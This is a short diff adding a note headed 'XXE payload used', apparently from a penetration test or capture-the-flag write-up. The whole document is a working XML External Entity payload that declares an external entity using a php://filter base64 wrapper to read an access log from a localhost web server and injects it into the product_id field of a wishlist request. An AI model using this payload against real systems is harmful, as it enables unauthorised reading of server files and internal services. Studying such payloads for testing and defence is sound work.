@@ -1,0 +1,10 @@
+XXE payload used:
+
+<!--?xml version="1.0"?-->
+<!DOCTYPE foo [<!ENTITY payload SYSTEM "php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/access.log"> ]>
+<wishlist>
+  <user_id>1</user_id>
+  <item>
+    <product_id>&payload;</product_id>
+  </item>
+</wishlist>
